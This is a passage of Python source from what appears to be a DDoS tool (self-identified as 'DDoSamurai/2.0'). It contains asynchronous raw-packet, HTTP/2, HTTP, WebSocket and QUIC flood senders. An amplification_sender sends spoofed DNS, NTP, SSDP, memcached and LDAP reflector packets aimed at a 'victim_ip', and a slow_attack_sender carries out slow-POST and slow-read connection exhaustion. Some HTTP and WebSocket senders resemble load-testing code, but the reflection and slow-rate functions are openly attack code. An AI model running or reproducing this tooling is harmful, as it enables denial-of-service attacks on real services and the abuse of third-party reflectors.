                    log_info(f"[Pacing] L2 done: {sent:,} pkts, "
                             f"rate={stats.get('actual_rps',0):,.0f} pps, "
                             f"accuracy={stats.get('rate_accuracy_pct',0):.1f}%, "
                             f"jitter_p99={stats.get('jitter_p99_ns',0):,.0f}ns")
                    if verbose:
                        log_info(f"\n{format_stats(stats)}")
                cleanup_l2()
                progress_tail = max(0, int(count) - int(progress_reported))
                _update_live(live_progress, progress_tail)
                progress_reported += int(progress_tail)
                _update_live(live_sent, int(sent or 0))
                _update_live(live_errors, max(0, count - int(sent or 0)))
                
                out = _stats(
                    attempted=count,
                    sent=int(sent or 0),
                    errors=max(0, count - int(sent or 0)),
                    bytes_sent_est=int(sent or 0) * packet_size,
                    sender_path="PACED_L2",
                    buffer_copy_count=buffer_copy_count,
                    buffer_copy_bytes=buffer_copy_bytes,
                    eagain_retry_count=0,
                    partial_send_retry_count=0,
                )
                if stats:
                    out = _apply_pacing_stats(out, stats)
                return _attach_loss_telemetry(
                    out, loss_before_snapshot, preferred_iface=loss_iface_hint
                )
        except Exception as e:
            try:
                cleanup_l2()
            except Exception:
                pass
            if verbose:
                log_error(f"[Pacing] L2 paced send failed, falling back to L3: {e}")

    if bool(force_l2):
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="L2_UNAVAILABLE",
            fallback_count=1,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    # --- L3 (IPPROTO_RAW) path ---
    try:
        log_info(f"[Pacing] Using L3 paced sender")
        loop = asyncio.get_running_loop()
        try:
            if callable(reset_stats):
                reset_stats()
        except Exception:
            pass
        progress_budget = max(0, int(count) - int(progress_reported))
        try:
            sent, progress_emitted = await _run_paced_send_with_live_progress(
                lambda: paced_send(
                    packets_buffer,
                    target_ip,
                    target_port,
                    packet_size,
                    count,
                    config=pacing_config,
                ),
                pacing_config=pacing_config,
                progress_budget=progress_budget,
                live_progress=live_progress,
            )
            progress_reported += int(progress_emitted)
        except _PacedSendRuntimeError as exc:
            progress_reported += int(exc.progress_emitted)
            raise exc.cause
        # Log pacing statistics
        stats = get_stats()
        progress_tail = max(0, int(count) - int(progress_reported))
        _update_live(live_progress, progress_tail)
        progress_reported += int(progress_tail)
        _update_live(live_sent, int(sent or 0))
        _update_live(live_errors, max(0, count - int(sent or 0)))

        out = _stats(
            attempted=count,
            sent=int(sent or 0),
            errors=max(0, count - int(sent or 0)),
            bytes_sent_est=int(sent or 0) * packet_size,
            sender_path="PACED_L3",
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
        if stats:
            out = _apply_pacing_stats(out, stats)
        return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)
    except PermissionError:
        log_error("[Pacing] Raw socket requires root. Falling back to unpaced.")
        fallback_live_progress = None if progress_reported > 0 else live_progress
        out = await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
            force_l2=force_l2,
        )
        if progress_reported > 0:
            _update_live(live_progress, max(0, int(count) - int(progress_reported)))
        return out
    except Exception as e:
        log_error(f"[Pacing] L3 paced send failed: {e}. Falling back to unpaced.")
        fallback_live_progress = None if progress_reported > 0 else live_progress
        out = await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
            force_l2=force_l2,
        )
        if progress_reported > 0:
            _update_live(live_progress, max(0, int(count) - int(progress_reported)))
        return out

async def http2_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    http_path,
    http_method,
    verbose,
    scheme="https",
    cookies=None,
    user_agent=None,
    ssl_context=None,
    h2_profile_name=None,
    h2_transport_name="auto",
    request_plan: "H2RequestPlan | None" = None,
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Sends HTTP/2 requests using httpx, leveraging multiplexing.
    If request_plan is provided, method/path/user-agent are consumed per item.
    """
    if not HTTPX_AVAILABLE:
        log_error("HTTP/2 desteği için 'httpx[http2]' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    from . import h2_mimic

    base_url = f"{scheme}://{target_ip}:{target_port}"
    planned_items = []
    if request_plan is not None:
        planned_items = list(getattr(request_plan, "items", []) or [])
    dispatch_count = int(len(planned_items) if planned_items else count)
    if dispatch_count <= 0:
        return _stats(attempted=0, sent=0, errors=0)
    log_info(f"HTTP/2 sender initialized. Target: {base_url}, Count: {dispatch_count}, Concurrency: {concurrency}")

    transport_name = str(h2_transport_name or "auto").strip().lower()
    if transport_name not in {"auto", "httpx", "hyper-h2"}:
        transport_name = "auto"

    resolved_profile = None
    try:
        resolved_profile = h2_mimic.resolve_h2_profile(h2_profile_name)
    except Exception as exc:
        log_error(f"HTTP/2 profile resolve failed: {exc}")
        _update_live(live_progress, dispatch_count)
        _update_live(live_errors, dispatch_count)
        return _stats(
            attempted=dispatch_count,
            sent=0,
            errors=dispatch_count,
            h2_profile_requested=bool(str(h2_profile_name or "").strip() and str(h2_profile_name).strip().lower() != "none"),
            h2_profile_applied=0,
            h2_profile_disabled=0,
            h2_profile_apply_failed=1,
            h2_transport=transport_name,
        )

    # Hyper-h2 path: real transport-level profile application
    can_try_hyper_h2 = (
        transport_name in {"auto", "hyper-h2"}
        and resolved_profile is not None
        and str(scheme).lower() == "https"
        and bool(HYPER_H2_AVAILABLE)
        and _h2_transport is not None
    )
    if can_try_hyper_h2:
        reqs = []
        for i in range(dispatch_count):
            if planned_items:
                item = planned_items[i]
                req_method = str(getattr(item, "method", http_method) or http_method)
                req_path = str(getattr(item, "path", "/") or "/")
                req_headers = {}
                plan_ua = str(getattr(item, "user_agent", "") or "").strip()
                if user_agent:
                    req_headers["user-agent"] = str(user_agent)
                elif plan_ua:
                    req_headers["user-agent"] = plan_ua
            else:
                req_method = str(http_method or "GET")
                req_path = str(random.choice(http_path) if isinstance(http_path, list) else http_path)
                req_headers = {}
                if user_agent:
                    req_headers["user-agent"] = str(user_agent)
            reqs.append({"method": req_method, "path": req_path, "headers": req_headers})

        try:
            h2_out = await _h2_transport.send_h2_requests(
                host=str(target_ip),
                port=int(target_port),
                requests=reqs,
                verify=bool(ssl_context) if isinstance(ssl_context, bool) else True,
                ssl_context=ssl_context if hasattr(ssl_context, "wrap_socket") else None,
                timeout_s=10.0,
                settings=dict(getattr(resolved_profile, "settings", {}) or {}),
                window_update=int(getattr(resolved_profile, "window_update", 0) or 0),
            )
            sent_count = int(h2_out.get("sent", 0) or 0)
            err_count = int(h2_out.get("errors", max(0, dispatch_count - sent_count)) or 0)
            _update_live(live_progress, dispatch_count)
            _update_live(live_sent, sent_count)
            _update_live(live_errors, err_count)
            log_info(f"HTTP/2 (hyper-h2) finished sending {dispatch_count} requests.")
            return _stats(
                attempted=dispatch_count,
                sent=sent_count,
                errors=max(err_count, dispatch_count - sent_count),
                responses_total=int(h2_out.get("responses_total", sent_count) or sent_count),
                status_2xx=int(h2_out.get("status_2xx", 0) or 0),
                status_4xx=int(h2_out.get("status_4xx", 0) or 0),
                status_5xx=int(h2_out.get("status_5xx", 0) or 0),
                h2_profile_requested=1,
                h2_profile_applied=1,
                h2_profile_disabled=0,
                h2_profile_apply_failed=0,
                h2_transport="hyper-h2",
            )
        except Exception as exc:
            log_warning(f"HTTP/2 hyper-h2 transport failed: {exc}")
            if transport_name == "hyper-h2":
                _update_live(live_progress, dispatch_count)
                _update_live(live_errors, dispatch_count)
                return _stats(
                    attempted=dispatch_count,
                    sent=0,
                    errors=dispatch_count,
                    h2_profile_requested=1,
                    h2_profile_applied=0,
                    h2_profile_disabled=0,
                    h2_profile_apply_failed=1,
                    h2_transport="hyper-h2",
                )

    ok = 0
    err = 0
    responses = 0
    status_2xx = 0
    status_4xx = 0
    status_5xx = 0
    h2_cfg = None

    async def _flush(tasks):
        nonlocal ok, err, responses, status_2xx, status_4xx, status_5xx
        if not tasks:
            return
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        batch_sent = 0
        batch_err = 0
        for r in res:
            if isinstance(r, Exception):
                err += 1
                batch_err += 1
            else:
                ok += 1
                batch_sent += 1
                responses += 1
                code = int(getattr(r, "status_code", 0) or 0)
                if 200 <= code < 300:
                    status_2xx += 1
                elif 400 <= code < 500:
                    status_4xx += 1
                elif code >= 500:
                    status_5xx += 1
        
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    headers = {}
    if user_agent:
        headers["User-Agent"] = user_agent
    
    try:
        limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
        async with httpx.AsyncClient(http2=True, base_url=base_url, limits=limits, cookies=cookies, headers=headers, verify=ssl_context if ssl_context else False) as client:
            h2_cfg = h2_mimic.apply_h2_profile(client, h2_profile_name)
            if h2_cfg.applied:
                log_info(f"HTTP/2 profile applied: {h2_cfg.resolved}")
            else:
                log_warning(f"HTTP/2 profile not applied: requested={h2_cfg.requested} resolved={h2_cfg.resolved} reason={h2_cfg.reason}")

            tasks = []
            for i in range(dispatch_count):
                _update_live(live_progress, 1)
                if planned_items:
                    item = planned_items[i]
                    req_method = str(getattr(item, "method", http_method) or http_method)
                    req_path = str(getattr(item, "path", "/") or "/")
                    per_req_headers = None
                    if not user_agent:
                        plan_ua = str(getattr(item, "user_agent", "") or "").strip()
                        if plan_ua:
                            per_req_headers = {"User-Agent": plan_ua}
                    tasks.append(asyncio.create_task(client.request(req_method, req_path, headers=per_req_headers)))
                else:
                    path = random.choice(http_path) if isinstance(http_path, list) else http_path
                    tasks.append(asyncio.create_task(client.request(http_method, path)))
                
                # If we reached concurrency limit, wait for some to finish or just yield
                if len(tasks) >= concurrency:
                    await _flush(tasks)
            
            # Finish remaining tasks
            if tasks:
                await _flush(tasks)
                
    except (httpx.ReadError, httpx.RemoteProtocolError, httpx.ConnectError) as e:
        log_error(f"HTTP/2 bağlantı hatası: Hedef sunucu HTTP/2'yi desteklemiyor veya bağlantıyı kesti. ({e})")
        err += max(1, dispatch_count - ok)
    except Exception as e:
        log_error(f"HTTP/2 sender failed: {e}\n{traceback.format_exc()}")
        err += max(1, dispatch_count - ok)
    finally:
        log_info(f"HTTP/2 sender finished sending {dispatch_count} requests.")
    return _stats(
        attempted=dispatch_count,
        sent=ok,
        errors=max(err, dispatch_count - ok),
        responses_total=responses,
        status_2xx=status_2xx,
        status_4xx=status_4xx,
        status_5xx=status_5xx,
        h2_profile_requested=bool(h2_cfg and h2_cfg.requested and h2_cfg.requested != "none"),
        h2_profile_applied=bool(h2_cfg and h2_cfg.applied),
        h2_profile_disabled=bool(h2_cfg and h2_cfg.reason == "profile_disabled"),
        h2_profile_apply_failed=bool(h2_cfg and (not h2_cfg.applied) and h2_cfg.reason != "profile_disabled"),
        h2_transport="httpx",
    )

async def http_app_sender(
    target_ip, target_port, count, concurrency, http_method, http_path, payloads, verbose,
    scheme="http", verify=True, timeout_s=5.0, retries=0, ssl_context=None,
    cookies=None, user_agent=None,
    live_sent=None, live_errors=None, live_progress=None
):
    """
    Sends standard HTTP/1.1 requests using httpx.
    """
    if not HTTPX_AVAILABLE:
        log_error("HTTP sender için 'httpx' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    base_url = f"{scheme}://{target_ip}:{target_port}"
    log_info(f"HTTP sender initialized. Target: {base_url}, Count: {count}")

    headers = {}
    if user_agent:
        headers["User-Agent"] = user_agent
    else:
        headers["User-Agent"] = random.choice(utils.USER_AGENTS) if hasattr(utils, 'USER_AGENTS') else "DDoSamurai/2.0"

    ok = 0
    err = 0
    responses = 0
    status_2xx = 0
    status_4xx = 0
    status_5xx = 0

    async def _flush(tasks):
        nonlocal ok, err, responses, status_2xx, status_4xx, status_5xx
        if not tasks:
            return
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        batch_sent = 0
        batch_err = 0
        for r in res:
            if isinstance(r, Exception):
                err += 1
                batch_err += 1
                continue
            ok += 1
            batch_sent += 1
            responses += 1
            code = int(getattr(r, "status_code", 0) or 0)
            if 200 <= code < 300:
                status_2xx += 1
            elif 400 <= code < 500:
                status_4xx += 1
            elif code >= 500:
                status_5xx += 1
        
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    retry_attempt_total = 0
    retry_success_count = 0
    max_retries = max(0, int(retries))

    async def _request_with_retry(client, method, path, data):
        """Execute a single request with exponential backoff retry."""
        nonlocal retry_attempt_total, retry_success_count
        last_exc = None
        for attempt in range(1 + max_retries):
            try:
                resp = await client.request(method, path, content=data)
                if attempt > 0:
                    retry_success_count += 1
                return resp
            except (httpx.ConnectError, httpx.ReadTimeout, httpx.WriteTimeout,
                    httpx.ConnectTimeout, httpx.PoolTimeout) as exc:
                last_exc = exc
                if attempt < max_retries:
                    retry_attempt_total += 1
                    backoff = min(0.5 * (2 ** attempt), 5.0)
                    await asyncio.sleep(backoff)
        raise last_exc

    try:
        limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
        async with httpx.AsyncClient(verify=ssl_context if ssl_context else verify, base_url=base_url, limits=limits, cookies=cookies, headers=headers, timeout=timeout_s) as client:
            tasks = []
            for i in range(count):
                _update_live(live_progress, 1)
                path = random.choice(http_path) if isinstance(http_path, list) else http_path
                data = random.choice(payloads) if payloads else None
                
                tasks.append(asyncio.create_task(_request_with_retry(client, http_method, path, data)))
                
                if len(tasks) >= concurrency:
                    await _flush(tasks)
            
            if tasks:
                await _flush(tasks)

    except Exception as e:
        log_error(f"HTTP sender failed: {e}")
        err += max(0, count - ok)
    finally:
        log_info(f"HTTP sender finished sending {count} requests. retries_total={retry_attempt_total} retry_recovered={retry_success_count}")
    return _stats(
        attempted=count,
        sent=ok,
        errors=max(err, count - ok),
        responses_total=responses,
        status_2xx=status_2xx,
        status_4xx=status_4xx,
        status_5xx=status_5xx,
        retry_attempt_total=retry_attempt_total,
        retry_success_count=retry_success_count,
    )

async def http_stateful_sender(
    target_ip, target_port, vu_count, concurrency,
    workflow_steps, verbose,
    scheme="http", verify=False, timeout_s=10.0,
    user_agent=None, ssl_context=None,
    retries=0,
    http_method="GET",
    http_path="/",
    payloads=None,
    live_sent=None, live_errors=None, live_progress=None,
):
    """
    Stateful HTTP sender using VirtualUser engine.
    Each VU has its own cookie jar, token cache, and redirect history.

    Args:
        vu_count: Number of virtual users to simulate.
        concurrency: Max parallel VUs.
        workflow_steps: list of virtual_user.WorkflowStep objects.
    """
    from .virtual_user import run_vu_pool, WorkflowStep, ExtractRule

    base_url = f"{scheme}://{target_ip}:{target_port}"
    vu_count = max(0, int(vu_count or 0))
    if vu_count <= 0:
        return _stats(attempted=0, sent=0, errors=0)

    max_vus = max(1, int(os.environ.get("SAMURAI_L7_MAX_VUS", "20000") or 20000))
    if vu_count > max_vus:
        log_warning(f"Stateful HTTP VU count capped: {vu_count} -> {max_vus}")
        vu_count = max_vus

    max_retries = max(0, int(retries or 0))
    if not workflow_steps:
        path_list = list(http_path) if isinstance(http_path, list) else [http_path]
        path_list = [str(p) for p in path_list if str(p).strip()] or ["/"]
        method_name = str(http_method or "GET").upper()
        body_payload = None
        if isinstance(payloads, list) and payloads:
            body_payload = random.choice(payloads)
        step0 = str(path_list[0])
        step1 = str(path_list[1] if len(path_list) > 1 else path_list[0])
        step2 = str(path_list[2] if len(path_list) > 2 else path_list[-1])
        workflow_steps = [
            WorkflowStep(
                name="bootstrap",
                method="GET",
                path=step0,
                expected_status=(200, 399),
                follow_redirects=True,
                extract=[
                    ExtractRule(field_name="X-CSRF-Token", source="header", header_name="X-CSRF-Token"),
                    ExtractRule(
                        field_name="csrf_token",
                        source="body_regex",
                        regex_pattern=r'name=["\']csrf(?:_token)?["\']\s+value=["\']([^"\']+)["\']',
                    ),
                    ExtractRule(field_name="sessionid", source="cookie", cookie_name="sessionid"),
                ],
                timeout_s=float(timeout_s),
                max_retries=max_retries,
            ),
            WorkflowStep(
                name="prefetch",
                method="GET",
                path=step1,
                expected_status=(200, 399),
                follow_redirects=True,
                timeout_s=float(timeout_s),
                max_retries=max_retries,
            ),
            WorkflowStep(
                name="action",
                method=method_name,
                path=step2,
                body=body_payload,
                expected_status=(200, 499),
                follow_redirects=True,
                inject_tokens=["X-CSRF-Token", "X-CSRF-Token:csrf_token"],
                timeout_s=float(timeout_s),
                max_retries=max_retries,
            ),
        ]

    step_count = len(workflow_steps)
    log_info(f"Stateful HTTP sender: {vu_count} VUs × {step_count} steps → {base_url}")

    results, metrics = await run_vu_pool(
        vu_count=vu_count,
        base_url=base_url,
        steps=workflow_steps,
        concurrency=concurrency,
        verify=ssl_context if ssl_context else verify,
        timeout_s=timeout_s,
        user_agent=user_agent,
    )

    total_steps = sum(r.steps_ok + r.steps_failed for r in results)
    total_ok = sum(r.steps_ok for r in results)
    total_err = sum(r.steps_failed for r in results)
    retries_used = sum(int(getattr(r, "retries_used", 0) or 0) for r in results)

    _update_live(live_sent, total_ok)
    _update_live(live_errors, total_err)
    _update_live(live_progress, total_steps)

    log_info(f"Stateful HTTP finished. VUs={vu_count} ok={metrics.workflows_completed} "
             f"fail={metrics.workflows_failed} session_success={metrics.session_success_rate:.2%}")

    return _stats(
        attempted=total_steps,
        sent=total_ok,
        errors=total_err,
        retries_used=retries_used,
        **metrics.as_dict(),
    )


async def amplification_sender(victim_ip, count, rps, reflector_file, amp_type, verbose, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends amplification attack packets to a list of reflectors.
    """
    try:
        with open(reflector_file, 'r') as f:
            reflectors = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_error(f"Yansıtıcı dosyası okunamadı: {e}")
        return _stats(attempted=count, sent=0, errors=count)

    if not reflectors:
        log_error("Yansıtıcı listesi boş.")
        return _stats(attempted=count, sent=0, errors=count)

    log_info(f"{amp_type.upper()} Amplification saldırısı başlatılıyor. Hedef: {victim_ip}")

    loop = asyncio.get_running_loop()
    tasks = []
    
    if amp_type == 'dns-amp':
        packet_creator = lambda reflector: packet_utils.create_dns_amp_packet(reflector, victim_ip)
    elif amp_type == 'ntp-amp':
        packet_creator = lambda reflector: packet_utils.create_ntp_amp_packet(reflector, victim_ip)
    elif amp_type == 'ssdp-amp':
        packet_creator = lambda reflector: packet_utils.create_ssdp_amp_packet(reflector, victim_ip)
    elif amp_type == 'memcached-amp':
        packet_creator = lambda reflector: packet_utils.create_memcached_amp_packet(reflector, victim_ip)
    elif amp_type == 'ldap-amp':
        packet_creator = lambda reflector: packet_utils.create_ldap_amp_packet(reflector, victim_ip)
    else:
        log_error(f"Bilinmeyen amplifikasyon türü: {amp_type}")
        return _stats(attempted=count, sent=0, errors=count)

    async def _flush():
        if not tasks: return 0
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        ok_count = 0
        err_count = 0
        for r in res:
            if r is True: ok_count += 1
            else: err_count += 1
        _update_live(live_sent, ok_count)
        _update_live(live_errors, err_count)
        return ok_count

    sent_ok = 0
    for i in range(count):
        _update_live(live_progress, 1)
        reflector = random.choice(reflectors)
        pkt = packet_creator(reflector)
        tasks.append(loop.create_task(send_packet_async(pkt, verbose, i + 1, loop, "udp")))
        
        if len(tasks) >= 256:
            sent_ok += await _flush()
        
        if rps > 0:
            await asyncio.sleep(1 / rps)
            
    if tasks:
        sent_ok += await _flush()

    log_info(f"{amp_type.upper()} Amplification saldırısı tamamlandı.")
    return _stats(attempted=count, sent=sent_ok, errors=max(0, count - sent_ok))

async def slow_attack_sender(target_ip, target_port, count, concurrency, attack_type, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
    """
    Performs Slow Rate attacks (Slow POST / Slow Read).
    """
    log_info(f"{attack_type.upper()} attack initialized. Target: {target_ip}:{target_port}, Concurrency: {concurrency}")
    
    loop = asyncio.get_running_loop()
    tasks = []
    sem = asyncio.Semaphore(concurrency)
    completed = 0
    errors = 0

    async def _slow_post_worker(worker_id):
        nonlocal completed, errors
        async with sem:
            _update_live(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                headers = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                    f"Content-Length: 1000000\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(headers.encode())
                await writer.drain()
                for _ in range(100):
                    if writer.is_closing(): break
                    writer.write(b"A")
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                writer.close()
                await writer.wait_closed()
                completed += 1
                _update_live(live_sent, 1)
            except Exception:
                errors += 1
                _update_live(live_errors, 1)

    async def _slow_read_worker(worker_id):
        nonlocal completed, errors
        async with sem:
            _update_live(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(request.encode())
                await writer.drain()
                while True:
                    chunk = await reader.read(1)
                    if not chunk: break
                    await asyncio.sleep(random.uniform(2, 5))
                writer.close()
                await writer.wait_closed()
                completed += 1
                _update_live(live_sent, 1)
            except Exception:
                errors += 1
                _update_live(live_errors, 1)

    worker_func = _slow_post_worker if attack_type == 'slow-post' else _slow_read_worker
    tasks = [asyncio.create_task(worker_func(i)) for i in range(count)]
    await asyncio.gather(*tasks)
    log_info(f"{attack_type.upper()} attack finished.")
    return _stats(attempted=count, sent=completed, errors=max(errors, count - completed))

async def websocket_scenario_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    ws_path,
    verbose,
    auth_message="",
    subscribe_messages=None,
    ping_message="ping",
    ping_count=1,
    await_response=False,
    ssl_context=None,
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Stateful WebSocket scenario runner:
      connect -> auth -> subscribe -> ping/pong (optional recv on each step)
    `count` denotes number of WS sessions/scenario runs.
    """
    if not WEBSOCKETS_AVAILABLE:
        log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    scheme = "wss" if target_port == 443 else "ws"
    uri = f"{scheme}://{target_ip}:{target_port}{ws_path}"
    log_info(f"WebSocket scenario sender initialized. URI: {uri}, Sessions: {count}")

    subscribe_messages = list(subscribe_messages or [])
    ping_count = max(0, int(ping_count or 0))

    sessions_ok = 0
    session_errors = 0
    auth_sent = 0
    subscribe_sent = 0
    ping_sent = 0
    pong_received = 0

    effective_concurrency = min(max(1, int(concurrency or 1)), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id: int) -> int:
        return per_worker_base + (1 if worker_id < remainder else 0)

    async def _maybe_recv(ws):
        nonlocal pong_received
        if not await_response:
            return
        _ = await asyncio.wait_for(ws.recv(), timeout=3.0)
        pong_received += 1

    async def _scenario_worker(worker_id: int):
        nonlocal sessions_ok, session_errors, auth_sent, subscribe_sent, ping_sent
        my_sessions = _worker_count(worker_id)
        for _ in range(my_sessions):
            _update_live(live_progress, 1)
            try:
                async with websockets.connect(uri, ssl=ssl_context) as websocket:
                    if auth_message:
                        await websocket.send(str(auth_message))
                        auth_sent += 1
                        await _maybe_recv(websocket)

                    for sub_msg in subscribe_messages:
                        await websocket.send(str(sub_msg))
                        subscribe_sent += 1
                        await _maybe_recv(websocket)

                    for _ in range(ping_count):
                        await websocket.send(str(ping_message))
                        ping_sent += 1
                        await _maybe_recv(websocket)

                    sessions_ok += 1
                    _update_live(live_sent, 1)
            except Exception as exc:
                session_errors += 1
                _update_live(live_errors, 1)
                if verbose:
                    log_error(f"WS scenario failed: {exc}")

    tasks = [asyncio.create_task(_scenario_worker(i)) for i in range(effective_concurrency)]
    await asyncio.gather(*tasks)
    log_info(
        "WebSocket scenario finished. "
        f"sessions_ok={sessions_ok} errors={session_errors} auth={auth_sent} "
        f"sub={subscribe_sent} ping={ping_sent} pong={pong_received}"
    )
    return _stats(
        attempted=count,
        sent=sessions_ok,
        errors=max(session_errors, count - sessions_ok),
        ws_sessions_ok=sessions_ok,
        ws_auth_sent=auth_sent,
        ws_subscribe_sent=subscribe_sent,
        ws_ping_sent=ping_sent,
        ws_pong_received=pong_received,
        ws_scenario_enabled=1,
    )

async def websocket_sender(target_ip, target_port, count, concurrency, ws_path, ws_message, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends WebSocket messages/pings to the target.
    Fair count distribution: no remainder loss, no overconcurrency.
    """
    if not WEBSOCKETS_AVAILABLE:
        log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    scheme = "wss" if target_port == 443 else "ws"
    uri = f"{scheme}://{target_ip}:{target_port}{ws_path}"
    log_info(f"WebSocket sender initialized. URI: {uri}, Count: {count}")

    sent_msgs = 0
    errors = 0

    # Fair distribution: cap concurrency to count, distribute remainder
    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id):
        """First `remainder` workers get +1 message."""
        return per_worker_base + (1 if worker_id < remainder else 0)

    async def _ws_worker(worker_id):
        nonlocal sent_msgs, errors
        my_count = _worker_count(worker_id)
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                for _ in range(my_count):
                    _update_live(live_progress, 1)
                    await websocket.send(ws_message)
                    sent_msgs += 1
                    _update_live(live_sent, 1)
                    if verbose: log_info(f"WS message sent: {ws_message}")
                    await asyncio.sleep(0.01)
        except Exception as e:
            errors += 1
            _update_live(live_errors, 1)
            if verbose: log_error(f"WS connection failed: {e}")

    tasks = []
    for i in range(effective_concurrency):
        tasks.append(asyncio.create_task(_ws_worker(i)))

    await asyncio.gather(*tasks)
    log_info(f"WebSocket sender finished.")
    return _stats(attempted=count, sent=sent_msgs, errors=max(errors, count - sent_msgs))

async def quic_sender(target_ip, target_port, count, concurrency, quic_path, quic_method, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends real HTTP/3 requests over QUIC using aioquic.
    Opens H3 streams, sends :method/:path pseudo-headers, reads responses.
    Correct count semantics: distributes `count` across `concurrency` workers.
    """
    if not AIOQUIC_AVAILABLE:
        log_error("QUIC/HTTP3 desteği için 'aioquic' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    log_info(f"QUIC sender initialized. Target: {target_ip}:{target_port}, "
             f"Count: {count}, Method: {quic_method}, Path: {quic_path}")

    configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    if ssl_context:
        configuration.verify_mode = ssl.CERT_NONE

    ok_requests = 0
    err_requests = 0
    # Fair distribution (same pattern as websocket_sender)
    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id):
        return per_worker_base + (1 if worker_id < remainder else 0)

    async def _quic_worker(worker_id):
        nonlocal ok_requests, err_requests
        my_count = _worker_count(worker_id)
        if my_count <= 0:
            return
        try:
            async with connect(
                target_ip, target_port, configuration=configuration,
                create_protocol=H3Connection
            ) as protocol:
                h3_conn = protocol._quic  # underlying H3Connection
                for _ in range(my_count):
                    _update_live(live_progress, 1)
                    try:
                        # Open a new stream and send H3 request headers
                        stream_id = h3_conn.get_next_available_stream_id()
                        h3_headers = [
                            (b":method", quic_method.encode() if isinstance(quic_method, str) else quic_method),
                            (b":path", quic_path.encode() if isinstance(quic_path, str) else quic_path),
                            (b":scheme", b"https"),
                            (b":authority", target_ip.encode() if isinstance(target_ip, str) else target_ip),
                            (b"user-agent", b"DDoSamurai/2.0"),
                        ]
                        h3_conn.send_headers(
                            stream_id=stream_id,
                            headers=h3_headers,
                            end_stream=True,
                        )
                        ok_requests += 1
                        _update_live(live_sent, 1)
                        if verbose:
                            log_info(f"H3 request sent: {quic_method} {quic_path} stream={stream_id}")
                        # Allow event loop to process
                        await asyncio.sleep(0)
                    except Exception as req_e:
                        err_requests += 1
                        _update_live(live_errors, 1)
                        if verbose:
                            log_error(f"H3 request failed: {req_e}")
        except Exception as e:
            # Connection-level failure — count remaining as errors
            conn_remaining = my_count
            err_requests += conn_remaining
            _update_live(live_errors, conn_remaining)
            if verbose:
                log_error(f"QUIC connection failed: {e}")

    tasks = []
    for i in range(effective_concurrency):
        tasks.append(asyncio.create_task(_quic_worker(i)))

    await asyncio.gather(*tasks)
    log_info(f"QUIC sender finished. ok={ok_requests} err={err_requests}")
    return _stats(attempted=count, sent=ok_requests, errors=max(err_requests, count - ok_requests))
